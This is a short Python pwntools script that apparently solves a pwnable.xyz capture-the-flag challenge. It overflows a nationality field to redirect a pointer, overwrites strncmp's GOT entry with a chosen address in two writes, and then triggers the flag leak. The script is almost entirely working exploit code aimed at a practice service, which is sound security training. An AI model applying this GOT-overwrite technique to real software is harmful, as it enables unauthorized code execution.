import time
from pwn import *


def changeNationality(data):
	p.recvuntil("> ")
	p.sendline("2")

	p.recvuntil("nationality: ")
	p.sendline(data)


def changeAge(num):
	p.recvuntil("> ")
	p.sendline("3")

	p.recvuntil("age: ")
	p.sendline(str(num))


def getShell():
	p.recvuntil("> ")
	p.sendline("4")




p = remote("svc.pwnable.xyz", 30031)

# STEP1. Set Low Address[0x0040099C]
print("[*] Corrupt strncmp@got. Low Address[0x00603018]")
print("    value : 0x40099C")

payload = "A"*16 + "\x18\x30\x60\x00"

changeNationality(payload)
changeAge(0x40099C)




# STEP2. Set High Address[0x00000000]
print("\n[*] Corrupt strncmp@got. High Address[0x0060301C]")
print("    value : 0x0")

payload = "A"*16 + "\x1C\x30\x60\x00"

changeNationality(payload)
changeAge(0x0)



# STEP3. Leak Flag
print("\n[*] Leak Flag")
getShell()



p.interactive()
